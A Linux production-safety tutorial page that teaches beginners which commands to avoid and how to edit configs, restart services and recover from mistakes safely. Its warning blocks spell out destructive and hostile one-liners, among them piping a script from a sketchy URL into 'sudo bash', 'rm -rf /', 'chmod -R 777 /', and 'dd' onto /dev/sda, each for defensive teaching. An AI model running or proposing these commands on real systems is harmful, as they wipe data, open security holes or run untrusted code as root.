---
date: "2025-11-21 16:34"
title: The Linux Production Safety Guide
description: Learn what NOT to do on a production Linux server. The rules exist because someone broke something. Understand dangerous commands and how to avoid disasters.
---

# The "Don't Do This" Guide

!!! tip "Part of Day One"
    This is the seventh and final article in the [Day One: Getting Started](overview.md) series. Read this before making any changes to a production server.

You've learned what to do on a production server. Now let's talk about what **not** to do.

These aren't hypothetical dangers. Every rule here exists because someone (often a very smart someone) made this mistake and caused an outage. Learn from their pain.

**Read this before you do anything with `sudo`.**

---

## The Cardinal Rules

### Rule 1: Don't Run Commands You Don't Understand

Someone in a forum says "just run this":

``` bash title="DO NOT RUN THIS" linenums="1"
curl -s http://sketchy-site.com/fix.sh | sudo bash
```

**Never do this.** You're downloading and executing unknown code with root privileges.

Even if the command looks harmless, understand what it does before running it:

- `rm` deletes things
- `>` overwrites files
- `chmod 777` makes everything writable by everyone
- `dd` can destroy disks

**When in doubt:** Ask someone. Look it up. Don't just run it.

---

### Rule 2: Don't Make Changes Without Understanding Impact

Before changing anything, ask:

1. **What does this change do?**
2. **What could go wrong?**
3. **How do I undo it?**
4. **Is anyone else affected?**

If you can't answer these questions, you're not ready to make the change.

---

### Rule 3: Test in Lower Environments First

The hierarchy of environments exists for a reason:

```
Development → Staging → Production
   (safe)      (safe)     (dangerous)
```

**Never** test changes in production if you have staging available.

---

## The Dangerous Commands

### rm - Delete With Extreme Prejudice

`rm` doesn't move files to trash. It destroys them. Forever.

``` bash title="DANGEROUS - DO NOT RUN" linenums="1"
rm -rf /                    # Deletes EVERYTHING
rm -rf /*                   # Also deletes EVERYTHING
rm -rf /home/*              # Deletes all user data
rm -rf ./*                  # Deletes everything in current directory
```

!!! danger "The -rf Flags"
    - `-r` = Recursive (delete directories and contents)
    - `-f` = Force (no confirmation prompts)

    Together, they delete everything without asking. One typo and you've lost data.

**Safer alternatives:**

``` bash title="Safer Deletion" linenums="1"
# Check what you're about to delete first
ls /path/to/delete

# Remove without -f so you get prompts
rm -ri /path/to/delete  # (1)!

# Use trash-cli if available
trash-put /path/to/delete
```

1. `-r` still recurses into directories, but dropping `-f` and adding `-i` makes `rm` **i**nteractive — it prompts before deleting each file. Slower, but it catches mistakes before they happen.

---

### chmod 777 - The Security Disaster

``` bash title="DANGEROUS - DO NOT RUN" linenums="1"
chmod 777 /var/www/app        # Anyone can read/write/execute
chmod -R 777 /                # Security nightmare
```

`777` means: owner, group, AND everyone else can read, write, and execute.

**What's wrong with this?**

- Any user on the system can modify your files
- Attackers who get minimal access can now modify everything
- Some applications refuse to run with 777 permissions (SSH keys, for example)

**What to do instead:**

``` bash title="Proper Permissions" linenums="1"
# Make file readable by owner and group
chmod 640 /path/to/file

# Make directory accessible
chmod 750 /path/to/directory

# If you're not sure, ask what permissions should be
ls -la /path/to/file
```

---

### Restarting Services in Production

``` bash title="THINK BEFORE RUNNING" linenums="1"
sudo systemctl restart nginx
sudo service mysql restart
sudo reboot
```

These commands cause **downtime**. Even "restart" has a brief interruption.

**Before restarting anything:**

1. Is this production?
2. What depends on this service?
3. Is there a maintenance window?
4. Have you told anyone?
5. Is there a rollback plan?

**Better approach:**

- Ask: "Is it okay to restart nginx on prod?"
- Check if there's an on-call procedure
- Schedule a maintenance window if needed
- Use `reload` instead of `restart` when possible (zero-downtime config reload)

``` bash title="Reload vs Restart" linenums="1"
sudo systemctl reload nginx  # Reloads config without dropping connections
sudo systemctl restart nginx # Full restart, connections dropped
```

---

### Writing to System Files

``` bash title="DANGEROUS - DO NOT RUN" linenums="1"
echo "something" > /etc/hosts
cat something > /etc/passwd
> /var/log/syslog  # Truncates the log file
```

The `>` operator **overwrites** files. The `>>` operator appends. One wrong character and you've destroyed a critical system file.

**Before writing to any file:**

1. Is this a system file?
2. Do you have a backup?
3. Are you using `>` or `>>`?
4. Have you tested this command?

**Safer approach:**

``` bash title="Safer File Editing" linenums="1"
# Make a backup first
sudo cp /etc/hosts /etc/hosts.backup

# Edit safely — sudoedit opens a temp copy in your preferred editor
sudoedit /etc/hosts

# Verify the change
cat /etc/hosts
```

---

### dd - The Disk Destroyer

`dd` is powerful and dangerous. It writes raw data to devices.

``` bash title="WILL DESTROY YOUR DISK" linenums="1"
sudo dd if=/dev/zero of=/dev/sda  # Wipes the primary disk
```

If you see `dd` in a command, be extremely careful about the `of=` target. A wrong target destroys data instantly with no confirmation.

---

## Things That Seem Safe But Aren't

### Editing Config Files Directly

``` bash title="RISKY" linenums="1"
sudo vim /etc/nginx/nginx.conf
```

This isn't dangerous by itself, but:

- One syntax error can break the service
- You might accidentally save a half-finished edit
- Your preferred editor may not be vim

**The right tool: `sudoedit`**

`sudoedit` (also spelled `sudo -e`) is the correct way to edit system files. It:

1. Makes a temporary copy of the file
2. Opens it in **your user's default editor** (set by your `$EDITOR` environment variable — nano, vim, whatever you prefer)
3. Only writes back to the original if you save and exit cleanly

If you abort or make an error and don't save, the original file is untouched.

``` bash title="The Safe Way to Edit System Files" linenums="1"
sudoedit /etc/nginx/nginx.conf
# or equivalently:
sudo -e /etc/nginx/nginx.conf
```

**Set your preferred editor** (add to your `~/.bashrc` or `~/.zshrc`):

``` bash title="Set Your Editor" linenums="1"
export EDITOR=nano   # or vim, micro, etc.
```

**After editing, test and reload:**

``` bash title="Test and Reload" linenums="1"
# Test the config
sudo nginx -t

# Only reload if test passes
sudo systemctl reload nginx
```

### Running Scripts Without Reading Them

``` bash title="RISKY" linenums="1"
sudo ./fix-everything.sh
```

**Always read the script first:**

``` bash title="Check Script Contents" linenums="1"
cat ./fix-everything.sh
less ./fix-everything.sh
```

Look for `rm`, `dd`, `chmod`, service restarts, or anything you don't understand.

### Copying Commands from the Internet

That Stack Overflow answer might be:

- Outdated
- Written for a different Linux distribution
- Missing context
- Malicious (rare but possible)

**Always understand before running:**

- What does each part of the command do?
- Is this appropriate for your system?
- What's the worst that could happen?

---

## Production Safety Checklist

Before making any change in production:

| Check | Question |
|-------|----------|
| ✅ | Do I understand what this command does? |
| ✅ | Have I tested this in a lower environment? |
| ✅ | Do I have a rollback plan? |
| ✅ | Have I made a backup (if applicable)? |
| ✅ | Does anyone else need to know? |
| ✅ | Is there a change management process I should follow? |
| ✅ | Am I comfortable explaining this to my team lead? |

If any answer is "no", **stop and get help**.

---

## Practice Problems

??? question "Problem 1: Safe Config Edit Workflow"
    You need to check the `worker_processes` setting in `/etc/nginx/nginx.conf`. Walk through the safe approach: backup, view, verify — without actually changing anything.

    **Hint:** Three steps — backup the file, read it, validate the syntax.

    ??? tip "Answer"
        ```bash title="Safe Config Inspection Workflow" linenums="1"
        # 1. Make a backup (even before read-only inspection, if you might edit later)
        sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup

        # 2. Read the config (safe, read-only)
        grep "worker_processes" /etc/nginx/nginx.conf

        # 3. Validate current syntax (before touching anything)
        sudo nginx -t
        ```

        If you did edit and broke something:
        ```bash title="Restore from Backup" linenums="1"
        sudo cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf
        sudo nginx -t
        sudo systemctl reload nginx
        ```

??? question "Problem 2: The Pre-Change Checklist"
    Your team lead asks you to restart the `mysql` service on a production server. Before touching the keyboard, what questions do you need answers to?

    ??? tip "Answer"
        Work through the production safety checklist:

        1. **Do I understand what `systemctl restart mysql` does?** — Brief downtime. All active connections will drop.
        2. **Have I tested this in staging?** — Is there a staging server to verify first?
        3. **Do I have a rollback plan?** — If MySQL doesn't come back up, what's the procedure?
        4. **Does anyone else need to know?** — Is anyone currently using the database? Alert the team first.
        5. **Is there a change management process?** — Does this require a ticket, approval, or maintenance window?
        6. **Am I comfortable explaining this to my team lead?** — If not, ask before acting.

        If any answer is "no" or "I don't know" — stop and ask before proceeding.

## When Things Go Wrong

You made a mistake. Something broke. Now what?

### Don't Panic

Seriously. Panic leads to worse mistakes.

### Stop Making Changes

Don't try to "fix" it with more commands. You might make it worse.

### Document What Happened

What command did you run? What time? What server?

### Ask for Help

Tell your team immediately. The longer you wait, the worse it gets.

> "Hey, I ran [command] on [server] and [symptom]. I need help."

Much better than trying to fix it alone and making it worse.

### Learn from It

Every outage is a learning opportunity. Post-mortems exist to prevent repeats, not to assign blame.

---

## The Escape Hatches

### Ctrl+C - Stop Current Command

If a command is running and you want to stop it:

```
Ctrl+C
```

### Undo Recent File Edit

If you just edited a file and the service is broken:

``` bash title="Restore Backup" linenums="1"
sudo cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf
sudo systemctl reload nginx
```

### Check What Changed

``` bash title="Diff Against Backup" linenums="1"
diff /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
```

---

## Quick Reference: Safe vs Dangerous

| Safe (Read-Only) | Dangerous (Modifies) |
|------------------|----------------------|
| `ls`, `cat`, `less` | `rm`, `mv`, `cp` |
| `grep`, `find` | `chmod`, `chown` |
| `ps`, `top` | `kill`, `pkill` |
| `systemctl status` | `systemctl restart/stop` |
| `df`, `du` | `dd`, `mkfs` |
| `git log`, `git status` | `git push`, `git reset` |

---

## The Golden Rules Summary

1. **Understand before you run** — Don't blindly execute commands
2. **Test in staging first** — Production is not for experiments
3. **Make backups** — Before changing any config file
4. **Ask if unsure** — It's okay not to know everything
5. **Communicate** — Tell people before and after changes
6. **Have a rollback plan** — Know how to undo
7. **Stay calm** — Panic makes mistakes worse

---

## Further Reading

### Command References

- `man cp` — Understand the `-p` flag to preserve file permissions and timestamps when making backups
- `man diff` — Compare two files side-by-side to verify what changed before and after an edit
- `man chmod` — Understand permission notation before changing it

### Deep Dives

- [Google SRE Book - Managing Risk](https://sre.google/sre-book/managing-risk/) — Production safety from a site reliability engineering perspective; free online
- [The Art of Unix Programming](http://www.catb.org/esr/writings/taoup/) — Classic Unix philosophy including the principle of least surprise

### Related Articles

- [Understanding Your Permissions](permissions.md) — Know what you're allowed to do before you do it
- [Reading Logs](reading_logs.md) — When something goes wrong, logs are how you figure out what happened
- [Day One Overview](overview.md) — Recap of the complete Day One series

## You've Completed Day One!

Congratulations! You now know how to:

- ✅ Connect to a server via SSH
- ✅ Orient yourself on a new system
- ✅ Understand your permissions
- ✅ Explore safely
- ✅ Read logs like a pro
- ✅ Find documentation and understand what's running
- ✅ Avoid dangerous mistakes

**What's next?**

If you're a developer who just needed to work safely on Linux, you're done — come back when you need more.

If you're an IT professional who wants to actually own Linux — sysadmin, platform engineer, SRE — the **[Essentials](../essentials/command_line_fundamentals.md)** track is where the real work starts: filesystem layout, permissions management, user accounts, process control, pipes, and grep. Built for IT professionals, not beginners.
